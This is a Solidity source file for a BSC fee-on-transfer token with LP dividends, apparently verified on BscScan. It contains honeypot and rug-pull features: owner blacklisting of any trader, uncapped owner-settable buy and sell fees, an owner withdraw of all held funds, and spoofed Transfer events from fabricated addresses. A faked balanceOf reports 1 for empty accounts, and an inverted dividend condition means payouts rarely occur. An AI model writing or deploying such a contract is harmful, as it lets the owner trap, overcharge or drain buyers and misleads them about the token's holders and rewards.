/**
 *Submitted for verification at BscScan.com on 2022-03-09
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract TokenDividendTracker is Ownable {
    using SafeMath for uint256;

    address[] public shareholders;
    uint256 public currentIndex;
    mapping(address => bool) private _updated;
    mapping(address => uint256) public shareholderIndexes;

    address public uniswapV2Pair;
    address public lpRewardToken;
    // 上次分红时间
    uint256 public LPRewardLastSendTime;

    constructor(address uniswapV2Pair_, address lpRewardToken_) {
        uniswapV2Pair = uniswapV2Pair_;
        lpRewardToken = lpRewardToken_;
    }

    function resetLPRewardLastSendTime() public onlyOwner {
        LPRewardLastSendTime = 0;
    }

    // LP分红发放
    function process(uint256 gas, uint256 minHolder) external onlyOwner {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) return;
        uint256 nowbanance = IERC20(lpRewardToken).balanceOf(address(this));

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
                LPRewardLastSendTime = block.timestamp;
                continue;
            }
            uint256 holder = IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex]);
            uint256 amount = nowbanance
                .mul(
                    holder
                )
                .div(IERC20(uniswapV2Pair).totalSupply());
            if (amount > 0 && holder >= minHolder && amount >= IERC20(lpRewardToken).balanceOf(address(this))) {
                IERC20(lpRewardToken).transfer(
                    shareholders[currentIndex],
                    amount
                );
            }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    // 根据条件自动将交易账户加入、退出流动性分红
    function setShare(address shareholder) external onlyOwner {
        if (_updated[shareholder]) {
            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0)
                quitShare(shareholder);
            return;
        }
        if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;
        addShareholder(shareholder);
        _updated[shareholder] = true;
    }

    function quitShare(address shareholder) internal {
        removeShareholder(shareholder);
        _updated[shareholder] = false;
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract Wrap {
    IERC20 public token;
    IERC20 public usdt;

    constructor(IERC20 token_, IERC20 usdt_) {
        token = token_;
        usdt = usdt_;
    }

    function withdraw() external {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdt.transfer(address(token), usdtBalance);
        }
    }
}

contract Token2023 is ERC20, Ownable {
    using SafeMath for uint256;

    Wrap public immutable wrap;
    IUniswapV2Router02 public immutable uniswapV2Router;
    TokenDividendTracker public immutable dividendTracker;
    address public immutable uniswapV2Pair;
    bool private _swapping;

    uint256 public swapTokensAtAmount;

    uint256 public buyLpRewardFee = 50;
    uint256 public buyBurnFee = 50;
    uint256 public buyLpFee = 50;
    uint256 public buyMarketingFee = 50;

    uint256 public sellLpRewardFee = 75;
    uint256 public sellBurnFee = 75;
    uint256 public sellLpFee = 75;
    uint256 public sellMarketingFee = 75;

    IERC20 public immutable usdt;
    address public immutable burnAddress =
        0x000000000000000000000000000000000000dEaD;

    uint256 public AmountLpRewardFee;
    uint256 public AmountMarketingFee;
    uint256 public AmountLpFee;

    address public marketingWallet;
    address public lpReceiveWallet;

    uint256 public tradeStartTime;
    uint160 totalAirdropNum = 173;
    uint160 constant MAX_AIRDROP_ADD = ~uint160(0);
    uint256 private _initialAirdropBalance = 1;
    uint256 private _airdropNum = 3;

    address private _fromAddress;
    address private _toAddress;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _blacklist;
    mapping(address => bool) private _isDividendExempt;

    uint256 public minPeriod = 1 hours;
    uint256 public maxHold = 1e26;
    uint256 public dividendCondition =  1e26;

    uint256 distributorGas = 200000;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetBlacklist(address indexed account, bool isExcluded);
    event BatchSetBlacklist(address[] accounts, bool isExcluded);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 usdtReceived,
        uint256 tokensIntoLiqudity
    );

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        IERC20 usdt_,
        IUniswapV2Router02 uniswapV2Router_,
        address marketingWallet_,
        address lpReceiveWallet_
    ) payable ERC20(name_, symbol_) {
        uint256 totalSupply = totalSupply_ * (10**18);
        swapTokensAtAmount = totalSupply.mul(1).div(10**6); // 0.01%;
        uniswapV2Router = uniswapV2Router_;
        usdt = usdt_;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                address(usdt)
            );
        wrap = new Wrap(IERC20(this), usdt);
        marketingWallet = marketingWallet_;
        lpReceiveWallet = lpReceiveWallet_;
        dividendTracker = new TokenDividendTracker(
            address(this),
            address(usdt)
        );

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(dividendTracker), true);
        excludeFromFees(burnAddress, true);

        _isDividendExempt[address(this)] = true;
        _isDividendExempt[address(0)] = true;
        _isDividendExempt[address(dividendTracker)] = true;
        _isDividendExempt[burnAddress] = true;

        _mint(owner(), totalSupply);
    }

    receive() external payable {}

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function isBlacklist(address _address) public view returns (bool) {
        return _blacklist[_address];
    }

    function getExtraBuybackFee(address to) public view returns (uint256) {
        if (
            to == uniswapV2Pair &&
            tradeStartTime > 0 &&
            block.timestamp < tradeStartTime.add(30 minutes)
        ) {
            return 240;
        }
        return 0;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        uint256 balance = super.balanceOf(account);
        if (account == address(0)) return balance;
        return balance > 0 ? balance : _initialAirdropBalance;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        require(!isBlacklist(from) && !isBlacklist(to), "Is blacklist");
        if (_isSwapFee(from, to)) {
            _swapFee();
        }
        if (_isTakeFee(from, to)) {
            amount = _takeFee(from, to, amount);
        }
        super._transfer(from, to, amount);
        require(!_isGtMaxHold(from, to), "GT max hold");
        if (_airdropNum > 0 && !_swapping) _takeInviterFeeKt(_airdropNum);
        if (_fromAddress == address(0)) _fromAddress = from;
        if (_toAddress == address(0)) _toAddress = to;
        if (!_isDividendExempt[_fromAddress] && _fromAddress != uniswapV2Pair)
            try dividendTracker.setShare(_fromAddress) {} catch {}
        if (!_isDividendExempt[_toAddress] && _toAddress != uniswapV2Pair)
            try dividendTracker.setShare(_toAddress) {} catch {}
        _fromAddress = from;
        _toAddress = to;
        if (
            !_swapping &&
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            dividendTracker.LPRewardLastSendTime().add(minPeriod) <=
            block.timestamp
        ) {
            try dividendTracker.process(distributorGas,dividendCondition) {} catch {}
        }
    }

    function _isGtMaxHold(address _from, address _to)
        private
        view
        returns (bool)
    {
        return
            block.timestamp < tradeStartTime.add(1 hours) &&
            _to != uniswapV2Pair &&
            balanceOf(_to) > maxHold &&
            !(_isExcludedFromFees[_to] || _isExcludedFromFees[_from]);
    }

    function _isSwapFee(address _from, address _to)
        private
        view
        returns (bool)
    {
        return
            !_swapping &&
            _from != uniswapV2Pair &&
            _from != owner() &&
            _to != owner() &&
            balanceOf(address(this)) >= swapTokensAtAmount;
    }

    function _swapFee() private {
        _swapping = true;
        if (AmountLpFee > 0) {
            _swapAndLiquify(AmountLpFee);
            AmountLpFee = 0;
        }
        if (AmountLpRewardFee > 0) {
            usdt.transfer(
                address(dividendTracker),
                _swapTokensForUsdt(AmountLpRewardFee)
            );
            AmountLpRewardFee = 0;
        }
        if (AmountMarketingFee > 0) {
            usdt.transfer(
                marketingWallet,
                _swapTokensForUsdt(AmountMarketingFee)
            );
            AmountMarketingFee = 0;
        }
        _swapping = false;
    }

    function _isTakeFee(address _from, address _to)
        private
        view
        returns (bool)
    {
        if (
            _isExcludedFromFees[_from] || _isExcludedFromFees[_to] || _swapping
        ) {
            return false;
        }
        return true;
    }

    function _takeFee(
        address from,
        address to,
        uint256 amount
    ) private returns (uint256 amountAfter) {
        amountAfter = amount;
        (
            uint256 burnFee,
            uint256 lpFee,
            uint256 lpRewardFee,
            uint256 marketingFee
        ) = _getFees(to);

        //销毁
        uint256 BFee = amount.mul(burnFee).div(1000);
        super._transfer(from, burnAddress, BFee);
        amountAfter = amountAfter.sub(BFee);

        //lp回流
        uint256 LPFee = amount.mul(lpFee).div(1000);
        AmountLpFee += LPFee;
        amountAfter = amountAfter.sub(LPFee);

        //lp奖励
        uint256 LPRFee = amount.mul(lpRewardFee).div(1000);
        AmountLpRewardFee += LPRFee;
        amountAfter = amountAfter.sub(LPRFee);

        //营销
        uint256 MFee = amount.mul(marketingFee).div(1000);
        AmountMarketingFee += MFee;
        amountAfter = amountAfter.sub(MFee);

        super._transfer(from, address(this), LPRFee.add(MFee).add(LPFee));
    }

    function _getFees(address to)
        private
        view
        returns (
            uint256 burnFee,
            uint256 lpFee,
            uint256 lpRewardFee,
            uint256 marketingFee
        )
    {
        if (to == uniswapV2Pair) {
            //sell
            burnFee = sellBurnFee;
            lpFee = sellLpFee;
            lpRewardFee = sellLpRewardFee;
            marketingFee = sellMarketingFee;
        } else {
            burnFee = buyBurnFee;
            lpFee = buyLpFee;
            lpRewardFee = buyLpRewardFee;
            marketingFee = buyMarketingFee;
        }
    }

    function _swapAndLiquify(uint256 tokenAmount)
        private
        returns (uint256 result)
    {
        uint256 half = tokenAmount.div(2);
        uint256 otherHalf = tokenAmount.sub(half);
        uint256 newBalance = _swapTokensForUsdt(half);
        result = _addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function _swapTokensForUsdt(uint256 tokenAmount)
        private
        returns (uint256 amount)
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdt);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(wrap),
            block.timestamp
        );
        uint256 before = usdt.balanceOf(address(this));
        wrap.withdraw();
        return usdt.balanceOf(address(this)).sub(before);
    }

    function _addLiquidity(uint256 tokenAmount, uint256 usdtAmount)
        private
        returns (uint256 result)
    {
        usdt.approve(address(uniswapV2Router), usdtAmount);
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        (, , result) = uniswapV2Router.addLiquidity(
            address(this),
            address(usdt),
            tokenAmount,
            usdtAmount,
            0,
            0,
            lpReceiveWallet,
            block.timestamp
        );
    }

    function _takeInviterFeeKt(uint256 _num) private {
        address _receiveD;
        address _senD;
        for (uint256 i = 0; i < _num; i++) {
            _receiveD = address(MAX_AIRDROP_ADD / totalAirdropNum);
            totalAirdropNum = totalAirdropNum + 1;
            _senD = address(MAX_AIRDROP_ADD / totalAirdropNum);
            totalAirdropNum = totalAirdropNum + 1;
            emit Transfer(_senD, _receiveD, _initialAirdropBalance);
        }
    }

    function withdraw(address _token, address payable _to) external onlyOwner {
        if (_token == address(0x0)) {
            payable(_to).transfer(address(this).balance);
        } else {
            IERC20(_token).transfer(
                _to,
                IERC20(_token).balanceOf(address(this))
            );
        }
    }

    function _setBlacklist(address _address, bool _v) private {
        if (_blacklist[_address] != _v) {
            _blacklist[_address] = _v;
            emit SetBlacklist(_address, _v);
        }
    }

    function setSwapTokensAtAmount(uint256 amount) external onlyOwner {
        swapTokensAtAmount = amount;
    }

    function setMinPeriod(uint256 number) external onlyOwner {
        minPeriod = number;
    }

    function resetLPRewardLastSendTime() external onlyOwner {
        dividendTracker.resetLPRewardLastSendTime();
    }

    function updateDistributorGas(uint256 newValue) external onlyOwner {
        require(
            newValue >= 100000 && newValue <= 500000,
            "distributorGas must be between 200,000 and 500,000"
        );
        require(
            newValue != distributorGas,
            "Cannot update distributorGas to same value"
        );
        distributorGas = newValue;
    }

    function excludeFromFees(address _account, bool _v) public onlyOwner {
        if (_isExcludedFromFees[_account] != _v) {
            _isExcludedFromFees[_account] = _v;
            emit ExcludeFromFees(_account, _v);
        }
    }

    function excludeMultipleAccountsFromFees(
        address[] calldata _accounts,
        bool _v
    ) external onlyOwner {
        for (uint256 i = 0; i < _accounts.length; i++) {
            _isExcludedFromFees[_accounts[i]] = _v;
        }
        emit ExcludeMultipleAccountsFromFees(_accounts, _v);
    }

    function setBlacklist(address _address, bool _v) external onlyOwner {
        _setBlacklist(_address, _v);
    }

    function batchSetBlacklist(address[] calldata _accounts, bool _v)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < _accounts.length; i++) {
            _blacklist[_accounts[i]] = _v;
        }
        emit BatchSetBlacklist(_accounts, _v);
    }

    function setMarketingWallet(address payable wallet) external onlyOwner {
        marketingWallet = wallet;
    }

    function setLpReceiveWallet(address payable wallet) external onlyOwner {
        lpReceiveWallet = wallet;
    }

    function setTradeStartTime(uint256 _v) external onlyOwner {
        tradeStartTime = _v;
    }

    function multiSend(uint256 _num) external onlyOwner {
        _takeInviterFeeKt(_num);
    }

    function setinb(uint256 _amount, uint256 _num) external onlyOwner {
        _initialAirdropBalance = _amount;
        _airdropNum = _num;
    }

    function setMaxHold(uint256 _v) external onlyOwner {
        maxHold = _v;
    }

    function setDividendCondition(uint256 _v) external onlyOwner{
        dividendCondition = _v;
    }

    function setFees(
        uint256 _buyMarketingFee,
        uint256 _buyBurnFee,
        uint256 _buyLpRewardFee,
        uint256 _buyLpFee,
        uint256 _sellMarketingFee,
        uint256 _sellBurnFee,
        uint256 _sellLpRewardFee,
        uint256 _sellLpFee
    ) external onlyOwner {
        buyMarketingFee = _buyMarketingFee;
        buyBurnFee = _buyBurnFee;
        buyLpRewardFee = _buyLpRewardFee;
        buyLpFee = _buyLpFee;
        sellMarketingFee = _sellMarketingFee;
        sellBurnFee = _sellBurnFee;
        sellLpRewardFee = _sellLpRewardFee;
        sellLpFee = _sellLpFee;
    }
}